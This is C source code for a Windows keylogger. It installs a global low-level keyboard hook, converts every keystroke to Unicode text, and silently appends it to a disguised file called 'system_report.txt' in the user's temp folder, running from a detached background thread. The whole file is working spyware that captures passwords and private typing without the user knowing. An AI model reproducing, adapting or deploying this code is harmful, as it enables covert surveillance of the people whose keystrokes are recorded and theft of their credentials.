#ifndef _CRT_SECURE_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#endif

#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <threads.h>
#include <io.h>
#include <fcntl.h>
#include "win_misc.h"


#define KEYLOG_FILE L"system_report.txt"
#define MAX_UNICODE_CHARS 16
#define MAX_KEYBOARD_CHARS 265
#define VK_MASK_DOWN              0x8000
#define VK_MASK_UP                0x01

static HANDLE logFile = INVALID_HANDLE_VALUE;
HHOOK keyboardHook = NULL;

BOOLEAN IsNumericVK(DWORD vk) {

    return (vk >= 0x30 && vk <= 0x39);
}

BOOLEAN IsAlphaVK(DWORD vk) {

    return (vk >= 0x41 && vk <= 0x5a);
}


BOOLEAN IsShiftDown()
{
    return (GetAsyncKeyState(VK_SHIFT) & VK_MASK_DOWN) != 0;
}

BOOLEAN IsAltDown()
{
    return (GetAsyncKeyState(VK_MENU) & VK_MASK_DOWN) != 0;
}

BOOLEAN IsEnter(DWORD vk)
{
    return vk == VK_RETURN;
}

wchar_t * GetTempPathToKeylog()
{
    wchar_t * temp_path = NULL;
    temp_path = GetTempFolderPathWin32();

    if (!temp_path) return NULL;

    wcscat(temp_path, KEYLOG_FILE);

    return temp_path;
}

#define USE_UNICODE_EX 1

int32_t AsUnicode(wchar_t * out, int32_t sizeChars , DWORD key, DWORD scan)
{
    HWND    hwnd = GetForegroundWindow();
    DWORD   threadID = GetWindowThreadProcessId(hwnd, NULL);
    HKL     layout = GetKeyboardLayout(threadID);
    BYTE    kb_state[MAX_KEYBOARD_CHARS] = {0};
    GetKeyboardState(kb_state);


    if (IsShiftDown()) {    

        kb_state[VK_SHIFT] = 0xff;
    } 
    if (IsAltDown()) {
        kb_state[VK_MENU] = 0xff;
    }
    
    #if USE_UNICODE_EX
        return ToUnicodeEx(key, scan, kb_state, out, sizeChars, 0x00, layout);
    #else
        return ToUnicode(key, scan, kb_state, out, sizeChars, 0x00);
    #endif

}


LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {

    if (nCode == HC_ACTION) {
        
        if (wParam == WM_KEYDOWN) 
        {
            KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;

            if (!kbStruct) {
                return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
            }

            DWORD vkCode = kbStruct->vkCode;
            DWORD scanCode = kbStruct->scanCode;

            

            wchar_t data[MAX_UNICODE_CHARS] = {0};
            int32_t iConvResult = AsUnicode(data, MAX_UNICODE_CHARS,vkCode, scanCode);

            if (iConvResult > 0) {
                
                char specCharsBuf[MAX_PATH] = {0};


                if (vkCode == VK_BACK) {

                    strcpy(specCharsBuf, "(backspace)");
                    //Win32WriteStdout(specCharsBuf);
                } else if (vkCode == VK_SHIFT) {
                    strcpy(specCharsBuf, "<shift>");
                    //WriteFileWin32(specCharsBuf,)
                } else if (IsEnter(vkCode)) {
                    WriteFileWin32_unicode('\r', logFile);
                    WriteFileWin32_unicode('\n', logFile);
                } else if (vkCode == VK_MENU) {
                    strcpy(specCharsBuf, "<ALT>");
                    WriteFileWin32(specCharsBuf, strlen(specCharsBuf), logFile);
                }
                else 
                {
                    data[iConvResult] = L'\0';
                    
                    int32_t sizeChars = (int32_t)wcslen(data);
                    int32_t sizeBytes = (int32_t)(sizeof(wchar_t) * sizeChars);
                    
                    WriteFileWin32(data, sizeBytes, logFile);
                    
                }
                
            
            }
            
        }       
    }

    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}


void SetKeyboardHook() {

    wchar_t * path = NULL;
    path = GetTempPathToKeylog();

    logFile = OpenFileWithAppendWin32(path);

    if (!IsFileValidWin32(logFile)) {
        return;
    }

    free(path);

    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    if (keyboardHook == NULL) {
        CloseFileWin32(logFile);
    }
}


void RemoveKeyboardHook() {
    if (keyboardHook != NULL) {
        UnhookWindowsHookEx(keyboardHook);
        keyboardHook = NULL;
    }
    if (IsFileValidWin32(logFile)) {
        
        CloseFileWin32(logFile);

        logFile = INVALID_HANDLE_VALUE;
    }
}

static void _start_keyboard_record_hook_impl(void * userdata)
{
    (void)userdata;
    SetKeyboardHook();
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    RemoveKeyboardHook();
}

int StartKeyBoardRecording(void * userdata)
{
    _start_keyboard_record_hook_impl(userdata);
    return 0;
}

int CreateKeyBoardRecordingThread()
{
    thrd_t th;
    if (thrd_create(&th, StartKeyBoardRecording, NULL)) {
        return -1;
    }
    
    if (thrd_detach(th)) {
        return -1;
    }

    return 0;
}